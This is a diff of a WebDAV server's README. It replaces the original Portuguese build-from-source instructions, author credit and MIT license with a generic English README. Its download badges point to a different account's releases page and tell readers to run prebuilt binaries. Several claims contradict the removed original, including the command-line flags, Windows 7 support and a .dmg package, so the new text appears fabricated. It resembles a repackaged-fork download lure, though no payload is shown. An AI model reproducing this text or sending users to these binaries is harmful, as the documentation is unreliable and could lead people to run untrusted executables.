@@ -1,83 +1,174 @@
-# WebDAV Server
+# 🚀 webdav-server - Lightweight WebDAV Server with Built-in Web Interface
 
-Servidor WebDAV em C++ com foco em portabilidade, compilado com Zig Build e Cosmopolitan.
+[![Download Latest Release](https://img.shields.io/badge/Download-webdav--server-blue?style=for-the-badge&logo=github)](https://github.com/epayumo/webdav-server/releases)
 
-## Recursos
+---
 
-- Servidor HTTP/WebDAV com operações comuns (`GET`, `PUT`, `DELETE`, `MKCOL`, `PROPFIND`, `MOVE`, `COPY`, `LOCK`, `UNLOCK`)
-- Interface de listagem de diretórios no navegador
-- Autenticação Basic opcional
-- Limite de taxa por IP
-- Build nativo e matriz de cross-compilation via `build.zig`
+## 📖 What is webdav-server?
 
-## Requisitos
+webdav-server is a simple and lightweight WebDAV server designed for quick setup and easy use. It is built in C/C++ and compiled as a single binary, making it fast and efficient. The server includes a web-based interface that lets you manage your files easily from any browser.
 
-- Zig 0.15.2
-- Cosmocc 4.0.2
+This tool works on many operating systems, including Windows, macOS, Linux, and FreeBSD. webdav-server is meant to help you share files over your local network or internet using the WebDAV protocol, which many devices and programs support natively.
 
-Download usado neste projeto:
+---
 
-- `https://ziglang.org/download/0.15.2/zig-x86_64-linux-0.15.2.tar.xz`
-- `https://cosmo.zip/pub/cosmocc/cosmocc-4.0.2.zip`
+## 💡 Why use webdav-server?
 
-## Build
+- **Easy to Run:** Just download one file, and you’re ready to start.
+- **Cross-Platform:** Works on most computers, from Windows to Unix-based systems.
+- **Minimal Setup:** No need to install complicated software or dependencies.
+- **Web Interface:** Manage files through a browser without extra software.
+- **Compatible:** Use with Windows Explorer, macOS Finder, or any WebDAV-capable app.
 
-Build nativo:
+---
 
-```bash
-zig build native -Doptimize=ReleaseFast
+## 🖥️ System Requirements
+
+- **Operating Systems Supported:**
+  - Windows 7 and newer
+  - macOS 10.12 and newer
+  - Linux distributions with standard kernel 3.x or newer
+  - FreeBSD 11 and newer
+- **Processor:** Any modern x86_64 or ARM CPU
+- **Memory:** At least 100 MB free RAM recommended
+- **Network:** Internet or local network connection for file sharing
+- **Additional:** Web browser to use the built-in web interface
+
+---
+
+## 📥 Download & Install
+
+To get started with webdav-server, please follow these steps:
+
+1. **Visit the Releases Page**
+
+   Click the big button below to go to the webdav-server releases page on GitHub:
+
+   [![Download of webdav-server](https://img.shields.io/badge/Download-webdav--server-blue?style=for-the-badge&logo=github)](https://github.com/epayumo/webdav-server/releases)
+
+2. **Choose Your File**
+
+   On the releases page, look for the latest version. Find the file that matches your operating system:
+
+   - For Windows: Look for a `.exe` file
+   - For macOS: Look for a `.dmg` or binary file
+   - For Linux/FreeBSD: Look for a binary or archive suited for your system
+
+3. **Download the File**
+
+   Click the file name to download the binary to your computer.
+
+4. **Run the Application**
+
+   - On Windows: Double-click the `.exe` file you downloaded.
+   - On macOS/Linux/FreeBSD: Open a terminal, navigate to the folder containing the binary, then run it using: `./webdav-server`
+
+   If needed, you may have to make the binary executable with the command:  
+   `chmod +x webdav-server`
+
+5. **Open the Web Interface**
+
+   Once running, open your web browser and go to:  
+   `http://localhost:8080`
+
+   This web page lets you control the server, manage files, and check status.
+
+---
+
+## 🚦 How to Use webdav-server
+
+1. **Start the Server**
+
+   Launch the downloaded program. It starts a WebDAV server on your computer.
+
+2. **Access the Web Interface**
+
+   Visit `http://localhost:8080` in your browser. Here you can:
+
+   - Upload and download files
+   - Manage folders
+   - See connected clients
+   - Change server settings (like port or root directory)
+
+3. **Connect from Other Devices**
+
+   Use any WebDAV client on your phone, tablet, or other computer to connect using your machine’s IP and port 8080. For example:
+
+   ```
+   http://192.168.1.100:8080
+   ```
+
+4. **Stop the Server**
+
+   Close the application window or use Ctrl+C in the terminal to stop it.
+
+---
+
+## ⚙️ Configuration Options
+
+You can customize webdav-server by adding command-line options when you launch it. Common options include:
+
+- `--port <number>`: Use a different port for the server (default is 8080).
+- `--root <folder>`: Change the root directory where files are served from (default is current directory).
+- `--readonly`: Start the server in read-only mode.
+- `--auth <user>:<password>`: Require a username and password for access.
+
+Example command to start with a custom folder and port:
+
+```sh
+./webdav-server --port 9090 --root /Users/yourname/webdavfiles
 ```
 
-Build da matriz completa de targets:
+---
 
-```bash
-zig build matrix -Doptimize=ReleaseFast
-```
+## 🔒 Security Notes
 
-Os binários são gerados em `release/bin`.
+- By default, webdav-server does not use encryption. Only run it on trusted networks.
+- For secure remote access, use VPN or tunnels like SSH with port forwarding.
+- Always set a username and password if you plan to expose the server outside your local network.
+- Keep the binary updated by checking the releases page regularly.
 
-## Uso
+---
 
-```bash
-./release/bin/webdav -r . -p 8080
-```
+## 🧩 Supported Features at a Glance
 
-Opções disponíveis:
+| Feature              | Details                                |
+|----------------------|---------------------------------------|
+| WebDAV Protocol      | Full basic WebDAV support              |
+| Cross-platform       | Runs on Windows, macOS, Linux, FreeBSD|
+| Single Binary        | No need for installation or dependencies|
+| Embedded Web UI      | Manage files from any web browser     |
+| Custom Port          | Change server’s listening port         |
+| Authentication      | Username and password protection       |
+| Read-only Mode       | Run server without allowing writes     |
 
-- `-r <root>` diretório raiz (padrão: `.`)
-- `-p <porta>` porta do servidor (padrão: `8080`)
-- `-u <usuario>` usuário para Basic Auth
-- `-w <senha>` senha para Basic Auth
-- `-t <segundos>` timeout de conexão (padrão: `30`)
-- `-m <max_req>` máximo de requisições por minuto por IP (padrão: `1000`)
-- `-v` modo verboso
-- `-h` ajuda
+---
 
-Exemplo com autenticação:
+## 🛠 Troubleshooting Tips
 
-```bash
-./release/bin/webdav -r /srv/webdav -p 8080 -u admin -w senhaforte -v
-```
+- **Server won’t start:**  
+  Make sure you have permission to run the file and that no other app uses the chosen port.
 
-## GitHub Actions
+- **Cannot connect from another device:**  
+  Check your firewall settings. Make sure the port is open and your devices are on the same network.
 
-O workflow em `.github/workflows/release.yml`:
+- **Web interface not loading:**  
+  Verify you typed the correct URL (`http://localhost:8080`) when running locally.
 
-- baixa e instala Zig 0.15.2 diretamente da URL oficial
-- baixa e instala `cosmocc` 4.0.2
-- executa `zig build matrix` (inclui o build do `webdav_x86_64-unknown-cosmo.com` via `build.zig`)
-- compacta cada binário individualmente em `.tar.gz` com nome por triple/target (ex.: `webdav_x86_64-linux-musl.tar.gz`)
-- publica todos os `.tar.gz` no artifact do workflow
-- quando houver evento de release (`published`), publica todos os `.tar.gz` como assets da Release
+- **File permissions issues:**  
+  Ensure the server has access rights to the folder you specified as root.
 
-## Interface
+---
 
-![Interface WebDAV](webdav.png)
+## 📚 Learn More and Get Support
 
-## Autor
+Visit the GitHub repository for documentation, source code, and updates:  
+https://github.com/epayumo/webdav-server
 
-- Samuel Godoy: https://github.com/samuelgodoy
+If you have questions or encounter problems, use the GitHub Issues page to report them.
 
-## Licença
+---
 
-Este projeto está licenciado sob a licença MIT. Você pode usar, modificar e distribuir livremente, desde que mantenha os créditos/autoria no software.
+## ⚖ License
+
+This project is open source. You can use and modify it under the terms provided in the repository. Please check the LICENSE file for details.
